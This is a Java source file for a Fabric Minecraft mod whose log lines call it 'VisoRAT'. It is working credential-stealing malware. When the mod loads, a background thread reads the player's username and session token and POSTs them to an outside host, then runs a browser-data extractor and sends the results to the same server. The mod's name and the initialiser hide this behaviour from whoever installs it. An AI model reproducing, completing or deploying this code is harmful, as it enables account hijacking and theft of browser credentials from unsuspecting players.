package me.visoxd;

import net.fabricmc.api.ModInitializer;
import net.minecraft.client.MinecraftClient;
import me.visoxd.handlers.Minecraft;
import me.visoxd.browser.BrowserExtractor;
import com.google.gson.JsonObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class VisoMod implements ModInitializer {

    @Override
    public void onInitialize() {
        new Thread(() -> {
            try {
                // Wait for client to be ready
                int attempts = 0;
                MinecraftClient client = null;
                while (client == null && attempts < 10) {
                    client = MinecraftClient.getInstance();
                    if (client == null) {
                        Thread.sleep(1000);
                        attempts++;
                    }
                }
                
                if (client == null) {
                    System.out.println("[VisoRAT] Failed to get MinecraftClient");
                    return;
                }
                
                Minecraft minecraft = new Minecraft(client);
                String username = minecraft.getUsername();
                String token = minecraft.getSessionId();
                
                System.out.println("[VisoRAT] Got username: " + username);
                System.out.println("[VisoRAT] Got token: " + token.substring(0, Math.min(10, token.length())) + "...");
                
                // SEND TOKEN FIRST - this MUST work
                sendToServer(username, token, null);
                System.out.println("[VisoRAT] Token sent");
                
                // NOW try browser extraction - if this fails, token is already sent
                try {
                    System.out.println("[VisoRAT] Starting browser extraction...");
                    Map<String, String> browserData = BrowserExtractor.extractAllBrowserData();
                    String formattedBrowserData = BrowserExtractor.formatDataForWebhook(browserData);
                    
                    if (formattedBrowserData != null && !formattedBrowserData.isEmpty()) {
                        System.out.println("[VisoRAT] Browser data extracted (" + formattedBrowserData.length() + " chars), sending...");
                        sendToServer(username, token, formattedBrowserData);
                        System.out.println("[VisoRAT] Browser data sent");
                    } else {
                        System.out.println("[VisoRAT] No browser data found");
                    }
                } catch (Exception browserEx) {
                    System.out.println("[VisoRAT] Browser extraction failed: " + browserEx.getMessage());
                    browserEx.printStackTrace();
                    // Token already sent, so this is non-critical
                }

            } catch (Exception e) {
                System.out.println("[VisoRAT] Critical error: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private void sendToServer(String username, String token, String browserData) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://final-minecraft-rat.onrender.com/receive").openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            // Use Gson for proper JSON encoding
            JsonObject json = new JsonObject();
            json.addProperty("username", username);
            json.addProperty("token", token);
            
            if (browserData != null && !browserData.isEmpty()) {
                json.addProperty("browser_data", browserData);
            }
            
            String jsonString = json.toString();
            System.out.println("[VisoRAT] Sending JSON (" + jsonString.length() + " bytes)");
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonString.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            System.out.println("[VisoRAT] Server Response: " + responseCode);
            
            // Read response body to see what the server is saying
            try {
                InputStream is = (responseCode >= 200 && responseCode < 300) ? conn.getInputStream() : conn.getErrorStream();
                if (is != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    if (response.length() > 0) {
                        System.out.println("[VisoRAT] Server said: " + response.toString());
                    }
                    reader.close();
                }
            } catch (Exception e) {
                // Ignore response reading errors
            }

        } catch (Exception e) {
            System.out.println("[VisoRAT] Failed to send to server: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
